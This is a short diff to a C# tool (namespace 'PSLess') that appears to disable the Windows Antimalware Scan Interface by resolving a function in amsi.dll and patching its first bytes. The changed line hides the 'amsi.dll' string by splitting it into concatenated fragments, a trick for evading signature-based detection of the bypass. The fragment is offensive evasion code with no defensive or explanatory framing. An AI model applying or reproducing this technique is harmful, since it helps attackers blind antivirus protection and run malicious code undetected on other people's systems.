@@ -36,7 +36,7 @@ namespace PSLess
                 buffer+= Char.ConvertFromUtf32(value);
                 
             }
-            IntPtr Address = GetProcAddress(LoadLibrary("amsi.dll"), buffer);
+            IntPtr Address = GetProcAddress(LoadLibrary("a"+ "msi"+ ".dl" +"l"), buffer);
 
             UIntPtr size = (UIntPtr)5;
             uint p = 0;
